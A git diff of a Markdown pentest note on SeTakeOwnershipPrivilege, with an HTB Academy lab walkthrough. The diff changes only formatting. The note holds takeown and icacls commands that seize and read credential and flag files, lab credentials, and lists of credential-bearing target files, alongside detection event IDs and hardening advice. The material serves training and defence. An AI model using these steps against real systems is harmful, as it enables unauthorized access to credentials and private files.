@@ -1,19 +1,21 @@
-# SeTakeOwnershipPrivilege Exploitation
+# 🏠 SeTakeOwnershipPrivilege
 
 ## 🎯 Overview
 
-**SeTakeOwnershipPrivilege** grants users the ability to take ownership of any "securable object" including **NTFS files/folders**, **registry keys**, **services**, **processes**, and **Active Directory objects**. This privilege assigns **WRITE_OWNER** rights, allowing modification of object security descriptors to change ownership.
+**SeTakeOwnershipPrivilege** grants users the ability to take ownership of any "securable object" including **NTFS files/folders**, **registry keys**, **services**, **processes**, and **Active Directory objects**. This privilege assigns **WRITE\_OWNER** rights, allowing modification of object security descriptors to change ownership.
 
 ## 🔑 Privilege Fundamentals
 
 ### SeTakeOwnershipPrivilege Capabilities
-- **File/folder ownership** takeover on NTFS systems
-- **Registry key ownership** modification  
-- **Service ownership** changes
-- **Process ownership** manipulation
-- **Active Directory object** ownership control
+
+* **File/folder ownership** takeover on NTFS systems
+* **Registry key ownership** modification
+* **Service ownership** changes
+* **Process ownership** manipulation
+* **Active Directory object** ownership control
 
 ### Assignment Contexts
+
 ```cmd
 # Group Policy location:
 Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment
@@ -21,14 +23,16 @@ Computer Configuration → Windows Settings → Security Settings → Local Poli
 ```
 
 **Common Assignment Scenarios:**
-- **Administrators** - assigned by default
-- **Service accounts** - backup jobs, VSS snapshots
-- **Specialized roles** - often combined with SeBackupPrivilege, SeRestorePrivilege
-- **GPO abuse victims** - via SharpGPOAbuse attacks
+
+* **Administrators** - assigned by default
+* **Service accounts** - backup jobs, VSS snapshots
+* **Specialized roles** - often combined with SeBackupPrivilege, SeRestorePrivilege
+* **GPO abuse victims** - via SharpGPOAbuse attacks
 
 ## 📊 Privilege Detection & Enablement
 
 ### Enumeration
+
 ```cmd
 # Check current privileges
 whoami /priv
@@ -40,6 +44,7 @@ SeTakeOwnershipPrivilege      Take ownership of files or other objects    Disabl
 ### Privilege Activation
 
 #### Method 1: PowerShell Script
+
 ```powershell
 # Import privilege enablement script
 Import-Module .\Enable-Privilege.ps1
@@ -53,6 +58,7 @@ SeTakeOwnershipPrivilege      Take ownership of files or other objects    Enable
 ```
 
 #### Method 2: Manual Token Manipulation
+
 ```cmd
 # Use native Windows APIs to enable privilege
 # Requires elevated PowerShell context
@@ -63,6 +69,7 @@ SeTakeOwnershipPrivilege      Take ownership of files or other objects    Enable
 ### High-Value Targets
 
 #### System Configuration Files
+
 ```cmd
 # Web application configs
 c:\inetpub\wwwroot\web.config
@@ -84,6 +91,7 @@ c:\inetpub\wwwroot\web.config
 ```
 
 #### Credential Files
+
 ```cmd
 # Common password files
 passwords.*
@@ -101,6 +109,7 @@ credential.*
 ```
 
 #### Specialized Files
+
 ```cmd
 # Virtual machine files
 *.vhd, *.vhdx, *.vmdk
@@ -118,6 +127,7 @@ id_rsa, id_ed25519
 ## 💻 File Ownership Attack Technique
 
 ### Step 1: Target Assessment
+
 ```powershell
 # Examine target file details
 Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}
@@ -127,6 +137,7 @@ cmd /c dir /q 'C:\Department Shares\Private\IT'
 ```
 
 ### Step 2: Ownership Takeover
+
 ```cmd
 # Take ownership using takeown utility
 takeown /f 'C:\Department Shares\Private\IT\cred.txt'
@@ -136,6 +147,7 @@ SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now ow
 ```
 
 ### Step 3: Ownership Verification
+
 ```powershell
 # Confirm ownership change
 Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select name,directory,@{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
@@ -147,6 +159,7 @@ cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
 ```
 
 ### Step 4: Access Control Modification
+
 ```cmd
 # Test file access first
 cat 'C:\Department Shares\Private\IT\cred.txt'
@@ -161,6 +174,7 @@ Successfully processed 1 files; Failed processing 0 files
 ```
 
 ### Step 5: File Access
+
 ```powershell
 # Read file contents
 cat 'C:\Department Shares\Private\IT\cred.txt'
@@ -173,20 +187,23 @@ root:n1X_p0wer_us3er!
 ## 🎯 HTB Academy Lab Solution
 
 ### Lab Environment
-- **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
-- **Credentials**: `htb-student:HTB_@cademy_stdnt!`
-- **Access Method**: RDP
-- **Objective**: Leverage SeTakeOwnershipPrivilege over `C:\TakeOwn\flag.txt`
+
+* **Target**: `10.129.43.43` (ACADEMY-WINLPE-SRV01)
+* **Credentials**: `htb-student:HTB_@cademy_stdnt!`
+* **Access Method**: RDP
+* **Objective**: Leverage SeTakeOwnershipPrivilege over `C:\TakeOwn\flag.txt`
 
 ### Detailed Step-by-Step Solution
 
 #### 1. RDP Connection
+
 ```bash
 # Connect via RDP
 xfreerdp /v:10.129.43.43 /u:htb-student /p:'HTB_@cademy_stdnt!'
 ```
 
 #### 2. Privilege Verification
+
 ```cmd
 # Open elevated PowerShell (Run as Administrator)
 # Enter htb-student credentials when prompted
@@ -198,6 +215,7 @@ SeTakeOwnershipPrivilege      Take ownership of files or other objects    Disabl
 ```
 
 #### 3. Privilege Activation
+
 ```powershell
 # Download/locate Enable-Privilege.ps1 script
 # If not available, use manual method or download from GitHub
@@ -212,6 +230,7 @@ PS C:\> whoami /priv
 ```
 
 #### 4. Target File Analysis
+
 ```powershell
 # Examine target file
 Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}
@@ -221,6 +240,7 @@ cmd /c dir /q 'C:\TakeOwn\'
 ```
 
 #### 5. File Ownership Takeover
+
 ```cmd
 # Take ownership of flag.txt
 takeown /f 'C:\TakeOwn\flag.txt'
@@ -230,6 +250,7 @@ SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-S
 ```
 
 #### 6. Access Control Modification
+
 ```cmd
 # Grant full permissions to current user
 icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
@@ -240,6 +261,7 @@ Successfully processed 1 files; Failed processing 0 files
 ```
 
 #### 7. Flag Retrieval
+
 ```powershell
 # Read flag contents
 cat 'C:\TakeOwn\flag.txt'
@@ -252,6 +274,7 @@ Get-Content 'C:\TakeOwn\flag.txt'
 ### Alternative Methods
 
 #### Manual ACL Manipulation
+
 ```powershell
 # Using Get-Acl/Set-Acl for more granular control
 $acl = Get-Acl 'C:\TakeOwn\flag.txt'
@@ -260,6 +283,7 @@ Set-Acl -Path 'C:\TakeOwn\flag.txt' -AclObject $acl
 ```
 
 #### Registry Key Takeover
+
 ```cmd
 # Take ownership of registry keys (if applicable)
 takeown /f "HKLM\SOFTWARE\TargetKey" /r
@@ -268,6 +292,7 @@ takeown /f "HKLM\SOFTWARE\TargetKey" /r
 ## ⚠️ Impact & Considerations
 
 ### Destructive Nature
+
 ```cmd
 # HIGH RISK ACTIVITIES:
 - Live web.config file modification
@@ -277,6 +302,7 @@ takeown /f "HKLM\SOFTWARE\TargetKey" /r
 ```
 
 ### Reversion Challenges
+
 ```cmd
 # DIFFICULT TO REVERT:
 - Nested subdirectory permission changes
@@ -285,6 +311,7 @@ takeown /f "HKLM\SOFTWARE\TargetKey" /r
 ```
 
 ### Client Communication
+
 ```cmd
 # BEST PRACTICES:
 - Document all ownership changes
@@ -296,6 +323,7 @@ takeown /f "HKLM\SOFTWARE\TargetKey" /r
 ## 🔍 Detection Indicators
 
 ### File System Events
+
 ```cmd
 # Event IDs to monitor:
 Event ID 4670 - Object permissions changed
@@ -305,6 +333,7 @@ Event ID 4656 - Handle to object requested
 ```
 
 ### Process Activity
+
 ```cmd
 # Suspicious activities:
 - takeown.exe execution with critical files
@@ -314,6 +343,7 @@ Event ID 4656 - Handle to object requested
 ```
 
 ### Registry Monitoring
+
 ```cmd
 # Registry changes to watch:
 HKLM\SYSTEM\CurrentControlSet\Services (service ownership)
@@ -324,6 +354,7 @@ HKCU (user-specific changes)
 ## 🛡️ Defense Strategies
 
 ### Privilege Hardening
+
 ```cmd
 # Remove SeTakeOwnershipPrivilege from:
 - Non-essential service accounts
@@ -333,6 +364,7 @@ HKCU (user-specific changes)
 ```
 
 ### File System Protection
+
 ```cmd
 # Implement protections:
 - NTFS permissions auditing
@@ -342,6 +374,7 @@ HKCU (user-specific changes)
 ```
 
 ### Monitoring Implementation
+
 ```cmd
 # Deploy monitoring for:
 - Ownership change events
@@ -353,31 +386,35 @@ HKCU (user-specific changes)
 ## 📋 SeTakeOwnershipPrivilege Exploitation Checklist
 
 ### Prerequisites
-- [ ] **User account** with SeTakeOwnershipPrivilege assigned
-- [ ] **Elevated shell** (Run as Administrator) 
-- [ ] **Privilege enablement** capability (scripts/tools)
-- [ ] **Target file identification** (high-value assets)
+
+* [ ] **User account** with SeTakeOwnershipPrivilege assigned
+* [ ] **Elevated shell** (Run as Administrator)
+* [ ] **Privilege enablement** capability (scripts/tools)
+* [ ] **Target file identification** (high-value assets)
 
 ### Execution Steps
-- [ ] **Verify privilege** (`whoami /priv`)
-- [ ] **Enable privilege** (Enable-Privilege.ps1 or manual)
-- [ ] **Identify target** (sensitive files/directories)
-- [ ] **Take ownership** (`takeown /f [target]`)
-- [ ] **Modify ACL** (`icacls [target] /grant user:F`)
-- [ ] **Access content** (read/copy sensitive data)
+
+* [ ] **Verify privilege** (`whoami /priv`)
+* [ ] **Enable privilege** (Enable-Privilege.ps1 or manual)
+* [ ] **Identify target** (sensitive files/directories)
+* [ ] **Take ownership** (`takeown /f [target]`)
+* [ ] **Modify ACL** (`icacls [target] /grant user:F`)
+* [ ] **Access content** (read/copy sensitive data)
 
 ### Post-Exploitation
-- [ ] **Document changes** (ownership modifications)
-- [ ] **Attempt reversion** (restore original permissions)
-- [ ] **Extract data** (credentials, configurations)
-- [ ] **Report modifications** (client notification)
+
+* [ ] **Document changes** (ownership modifications)
+* [ ] **Attempt reversion** (restore original permissions)
+* [ ] **Extract data** (credentials, configurations)
+* [ ] **Report modifications** (client notification)
 
 ### File Targets Priority
-- [ ] **Web.config files** (application credentials)
-- [ ] **Registry backups** (SAM, SYSTEM, SECURITY)
-- [ ] **Password files** (*.txt, *.xlsx containing creds)
-- [ ] **Database files** (KeePass *.kdbx)
-- [ ] **Certificate stores** (*.pfx files)
+
+* [ ] **Web.config files** (application credentials)
+* [ ] **Registry backups** (SAM, SYSTEM, SECURITY)
+* [ ] **Password files** (\*.txt, \*.xlsx containing creds)
+* [ ] **Database files** (KeePass \*.kdbx)
+* [ ] **Certificate stores** (\*.pfx files)
 
 ## 💡 Key Takeaways
 
@@ -389,6 +426,6 @@ HKCU (user-specific changes)
 6. **GPO abuse** can grant privilege to controlled accounts
 7. **Detection** possible through file system event monitoring
 
----
+***
 
-*SeTakeOwnershipPrivilege exploitation provides powerful file system access but should be used with extreme caution due to its potentially destructive nature.* 
+_SeTakeOwnershipPrivilege exploitation provides powerful file system access but should be used with extreme caution due to its potentially destructive nature._
